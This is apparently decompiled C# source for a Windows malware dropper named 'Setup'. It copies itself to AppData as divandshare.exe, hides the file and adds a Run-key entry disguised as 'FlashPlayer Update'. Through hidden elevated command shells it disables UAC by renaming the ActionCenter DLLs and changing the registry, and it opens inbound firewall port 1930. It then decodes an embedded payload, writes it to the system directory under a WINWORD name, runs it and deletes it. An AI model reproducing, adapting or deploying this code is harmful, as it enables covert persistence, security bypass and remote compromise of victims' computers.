using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Runtime.Remoting.Metadata.W3cXsd2001;
using Microsoft.Win32;

namespace Setup;

internal class Program
{
	private static void Main(string[] args)
	{
		runnable();
		ResourceManager resourceManager = new ResourceManager("Data", Assembly.GetExecutingAssembly());
		string @string = resourceManager.GetString("mssKey");
		string string2 = resourceManager.GetString("mssExt");
		byte[] array = (byte[])resourceManager.GetObject("mssFile");
		if (@string.Length <= 0 || array.Length <= 0)
		{
			return;
		}
		array = scramble(array, @string);
		string text = Environment.SystemDirectory + "/WINWORD" + string2;
		try
		{
			FileStream fileStream = File.Open(text, FileMode.OpenOrCreate);
			fileStream.Write(array, 0, array.Length);
			fileStream.Close();
			Process process = Process.Start(text);
			while (!process.HasExited)
			{
			}
			try
			{
				File.Delete(text);
			}
			catch (Exception)
			{
			}
		}
		catch (Exception)
		{
		}
	}

	private static void runnable()
	{
		string location = Assembly.GetEntryAssembly()!.Location;
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (!File.Exists(folderPath + "/divandshare.exe"))
		{
			File.Copy(location, folderPath + "/divandshare.exe", overwrite: true);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "FlashPlayer Update", folderPath + "\\divandshare.exe", RegistryValueKind.String);
			string arguments = "/C ECHO Y|icacls " + folderPath + "/divandshare.exe /grant administrators:F";
			ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe", arguments);
			processStartInfo.Verb = "runas";
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo.UseShellExecute = true;
			Process.Start(processStartInfo);
			File.SetAttributes(folderPath + "/divandshare.exe", FileAttributes.Hidden);
		}
		int num = (int)Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "EnableLUA", RegistryValueKind.DWord);
		if (num == 1)
		{
			string arguments2 = "/k (takeown /f %systemroot%\\system32\\ActionCenter.dll | icacls %systemroot%\\system32\\ActionCenter.dll /grant administrators:F | takeown /f %systemroot%\\system32\\ActionCenterCPL.dll | icacls %systemroot%\\system32\\ActionCenterCPL.dll /grant administrators:F | taskkill /IM explorer.exe /f | ren %windir%\\system32\\ActionCenter.dll ActionCenter.bak | ren %windir%\\system32\\ActionCenterCPL.dll ActionCenterCPL.bak | cmd /k %windir%\\System32\\reg.exe ADD HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f) & exit";
			ProcessStartInfo processStartInfo2 = new ProcessStartInfo("cmd.exe", arguments2);
			processStartInfo2.Verb = "runas";
			processStartInfo2.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo2.UseShellExecute = true;
			Process process = Process.Start(processStartInfo2);
			while (!process.HasExited)
			{
			}
			ProcessStartInfo processStartInfo3 = new ProcessStartInfo(Path.Combine(Environment.GetEnvironmentVariable("windir"), "explorer.exe"));
			processStartInfo3.UseShellExecute = true;
			processStartInfo3.WindowStyle = ProcessWindowStyle.Hidden;
			Process.Start(processStartInfo3);
		}
		string arguments3 = "/k (netsh advfirewall firewall delete rule name=\"TCP/UDP Control\" | netsh advfirewall firewall add rule name=\"TCP/UDP Control\" dir=in action=allow protocol=TCP localport=1930 | netsh advfirewall firewall add rule name=\"TCP/UDP Control\" dir=in action=allow program=\"" + location + "\") & exit";
		ProcessStartInfo processStartInfo4 = new ProcessStartInfo("cmd.exe", arguments3);
		processStartInfo4.Verb = "runas";
		processStartInfo4.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo4.UseShellExecute = true;
		Process process2 = Process.Start(processStartInfo4);
		while (!process2.HasExited)
		{
		}
	}

	private static byte[] scramble(byte[] data, string keySet)
	{
		byte[] array = new byte[data.Length];
		byte[] value = SoapHexBinary.Parse(keySet).get_Value();
		for (int i = 0; i < data.Length; i++)
		{
			if (i < value.Length)
			{
				array[i] = (byte)((data[i] + value[i]) % 256);
			}
			else
			{
				array[i] = (byte)((data[i] + array[i - value.Length]) % 256);
			}
		}
		return array;
	}
}
